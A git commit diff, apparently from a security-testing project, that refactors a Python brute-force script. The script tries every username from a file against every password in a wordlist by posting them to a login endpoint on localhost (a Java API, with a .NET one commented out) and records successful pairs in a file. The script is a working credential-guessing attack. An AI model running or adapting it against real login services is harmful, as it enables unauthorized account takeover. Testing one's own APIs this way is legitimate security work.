c1d5c57eb005391b1c518e78c52062d6d25aaac5
Luzivan Gois <luzivangois@outlook.com>
2024-05-13 12:03:22 -0300

    Refatorado o scrip de Brute Force. Acrescentada API em .Net

--- bruteForce.py
+++ bruteForce.py
@@ -1,20 +1,26 @@
 import requests
 
-with open("usuarios_validos.txt", "r") as listausuarios:
-    linhas = listausuarios.readlines()
+with open("usuarios_validos.txt", "r") as users_list:
+    lines = users_list.readlines()
 
-    for linha in linhas:
+    for line in lines:
     
-        nome_usuario  = linha.strip()
+        user_name  = line.strip()
 
         with open("wordlist/pass.txt", "r") as wordlist:
             passwords = wordlist.readlines()
             
             for password in passwords:
-                senha = password.strip()    
-                payload  = {'login': nome_usuario, 'password': senha}
+                user_password = password.strip()    
+                payload  = {'login': user_name, 'password': user_password}
+
+                # Request API em Java
                 r = requests.post('http://localhost:8080/auth/login', json=payload)
-                retorno = r.status_code
-                if (retorno == 200):
-                    with open("senhas_validas.txt", "a") as resultado:
-                        resultado.write("\nLogin: " + nome_usuario + " | Senha: "+senha)
+
+                # Request API em .Net
+                # r = requests.post('http://localhost:5127/api/authentication/login', json=payload)
+
+                response = r.status_code
+                if (response == 200):
+                    with open("senhas_validas.txt", "a") as result:
+                        result.write("\nLogin: " + user_name + " | Senha: "+user_password)
